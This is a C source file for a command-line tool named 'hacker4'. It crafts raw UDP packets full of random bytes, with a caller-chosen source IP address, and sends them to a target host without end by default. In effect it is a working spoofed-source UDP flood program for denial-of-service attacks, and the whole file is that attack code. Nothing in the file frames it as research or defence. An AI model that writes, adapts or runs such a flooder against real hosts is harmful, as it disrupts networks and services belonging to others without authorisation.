#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <netinet/ip.h> 
#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <netinet/ip.h> 
#include <netinet/udp.h> 
#include <string.h>
#include <linux/if_packet.h>
#include <linux/if_ether.h>
#include <errno.h>

#include "socket.h"

int count = 0;
int len = 1400;
char local_ipv4_addr_name[100];
char target_ipv4_addr_name[100];
char device_name[100];
unsigned short dst_port = 6668;
unsigned short src_port = 6667;
int mode;

static void usage()
{
	printf("Usage : hacker4 [options] <local_ipv4_addr> <target_ipv4_addr>\n");
	printf("            options:  -n <count>         default value: 0\n");
	printf("                      -l <packet_len>    default value: 1400\n");
//	printf("                      -i <interface>     default value: eth0\n");
}

void init_socket()
{

}

static uint16_t udpchecksum(char *iphead, char *udphead, int udplen, int type)
{
    udphead[6] = udphead[7] = 0;
    uint32_t checksum = 0;
    //printf("udp checksum is 0x%02x%02x\n", (uint8_t)udphead[6], (uint8_t)udphead[7]);
    if (type == 6)
    {
        struct udp6_psedoheader header;
        memcpy(header.srcaddr, iphead + 24, 16);
        memcpy(header.dstaddr, iphead + 8, 16);
        header.length = ntohs(udplen);
        header.zero1 = header.zero2 = 0;
        header.next_header = 0x11;
        uint16_t *hptr = (uint16_t*)&header;
        int hlen = sizeof(header);
        while (hlen > 0) {
            checksum += *(hptr++);
            hlen -= 2;
        }
    }
    else if (type == 4)
    {
        struct udp4_psedoheader header;
        memcpy((char*)&header.srcaddr, iphead + 12, 4);
        memcpy((char*)&header.dstaddr, iphead + 16, 4);
        header.zero = 0;
        header.protocol = 0x11;
        header.length = ntohs(udplen);
        uint16_t *hptr = (uint16_t*)&header;
        int hlen = sizeof(header);
        while (hlen > 0) {
            checksum += *(hptr++);
            hlen -= 2;
        }
    }    
    uint16_t *uptr = (uint16_t*)udphead;
    while (udplen > 1) {    
        checksum += *(uptr++);
        udplen -= 2;
    }
    if (udplen) {
        checksum += (*((uint8_t*)uptr)) ;
    }
    do {
        checksum = (checksum >> 16) + (checksum & 0xFFFF);
    } while (checksum != (checksum & 0xFFFF));
    uint16_t ans = checksum;
    return (ans == 0xFF)? 0xFF :ntohs(~ans);
}

static uint16_t checksum(uint16_t *addr, int len)
{
    int nleft = len;
    int sum = 0;
    uint16_t *w = addr;
    uint16_t answer = 0;

    while (nleft > 1) {
        sum += *w++;
        nleft -= sizeof (uint16_t);
    }

    if (nleft == 1) {
        *(uint8_t *) (&answer) = *(uint8_t *) w;
        sum += answer;
    }

    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    answer = ~sum;
    return (answer);
}

void send_packet4(char* packet, int len)
{
    char buf[2000] = {0};
	memcpy(buf + 20 + 8, packet, len);
	struct udphdr *udp = (struct udphdr*)(buf + 20);
	udp->source = htons(src_port);
	udp->dest = htons(dst_port);
	udp->len = htons(len + 8);
	udp->check = 0;
	
	struct iphdr* ip = (struct iphdr*)(buf);
	ip->version = 4;
	ip->ihl = 5;
	ip->tos = 0x10;
	ip->tot_len = htons(len + 20 + 8);
	ip->id = 0;
	ip->frag_off = 0;
	ip->ttl = 128;
	ip->protocol = UDP;
	ip->check = 0;
	inet_aton(local_ipv4_addr_name, &(ip->saddr));
	inet_aton(target_ipv4_addr_name, &(ip->daddr));
	
	udp->check = htons(udpchecksum((char*)ip, (char*)udp, len + 8, 4));
	ip->check = checksum((uint16_t*)ip, 20);
	
	int total_len = len + 20 + 8;
	
	int fd = socket(PF_INET, SOCK_RAW, IPPROTO_RAW);
	if (fd < 0) {
		fprintf(stderr, "Failed to create send socket.\n");
		exit(1);
	}
	
	/*
	struct sockaddr_ll device;
	if ((device.sll_ifindex = if_nametoindex(device_name)) == 0) {
		fprintf(stderr, "Failed to resolve the index of %s.\n", device_name);
		exit(1);
	}
	*/
	
	struct sockaddr_in addr;
	addr.sin_family = AF_INET;
	addr.sin_port = htons(dst_port);
	inet_aton(target_ipv4_addr_name, &(addr.sin_addr));
	
	if (sendto(fd, buf, total_len, 0, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
		fprintf(stderr, "Failed to send ipv4 packet. err %d\n", errno);
		exit(1);
	}
	close(fd);
}

void sendpacket()
{
    char buf[2000];
    int i;
    for (i = 0; i < len; ++i)
        buf[i] = rand() & 0xFF;
    send_packet4(buf, len);
}

int main(int argc, char **argv)
{
    strcpy(device_name, "eth0");
    mode = 4;
	int i;
	for (i = 1; i < argc; ++i) {
		if (i + 1 < argc && strcmp(argv[i], "-n") == 0) {
			++i;
			sscanf(argv[i], "%d", &count);
        } else if (i + 1 < argc && strcmp(argv[i], "-l") == 0) {
			++i;
			sscanf(argv[i], "%d", &len);
	    } else if (i + 1 < argc && strcmp(argv[i], "-i") == 0) {
			++i;
			strcpy(device_name, argv[i]);
	    } else if (i + 1 < argc) {
	        strcpy(local_ipv4_addr_name, argv[i++]);
	        strcpy(target_ipv4_addr_name, argv[i]);
	        printf("local ipv4 addr : %s  target ipv4 addr : %s\n", local_ipv4_addr_name, target_ipv4_addr_name);
		} else {//config-interface
			usage();
			return 0;
		}
	}
	if (strlen(local_ipv4_addr_name) == 0 || strlen(target_ipv4_addr_name) == 0) {
	    usage();
	    return 0;
	}
    printf("count=%d\n", count);
    init_socket();
    for (i = 0; i < count || count <= 0; ++i) {
        sendpacket();
    }
}
